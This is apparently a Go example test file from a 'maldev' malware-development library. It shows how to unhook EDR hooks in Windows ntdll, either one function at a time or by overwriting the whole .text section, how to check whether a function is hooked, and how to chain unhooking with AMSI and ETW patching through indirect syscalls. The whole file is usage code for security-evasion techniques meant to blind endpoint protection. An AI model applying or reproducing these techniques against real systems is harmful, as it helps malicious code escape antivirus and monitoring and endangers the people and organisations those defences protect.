//go:build windows

package unhook_test

import (
	"fmt"

	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/unhook"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// Classic restores the first 5 prologue bytes of a single ntdll function
// from a clean disk read. Suitable when you know exactly which syscall
// is hooked.
func ExampleClassic() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	if err := unhook.ClassicUnhook("NtAllocateVirtualMemory", caller, nil); err != nil {
		fmt.Println("unhook:", err)
	}
}

// Full replaces the entire ntdll .text section in one memcpy. Safe even
// if NtCreateFile / NtReadFile are themselves hooked because the disk
// read completes before any patch is applied.
func ExampleFull() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	if err := unhook.FullUnhook(caller, nil); err != nil {
		fmt.Println("full:", err)
	}
}

// IsHooked checks a single function without restoring it. Useful for
// pre-flight detection.
func ExampleIsHooked() {
	hooked, err := unhook.IsHooked("NtCreateThreadEx")
	if err != nil {
		fmt.Println("check:", err)
		return
	}
	fmt.Printf("NtCreateThreadEx hooked: %v\n", hooked)
}

// Compose with evasion.ApplyAll: unhook the common set, then patch
// AMSI/ETW. Order matters — restore ntdll first so the subsequent
// patches route through clean syscall stubs.
func Example_chain() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	techniques := append([]evasion.Technique{}, unhook.CommonClassic()...)
	_ = evasion.ApplyAll(techniques, caller)
}
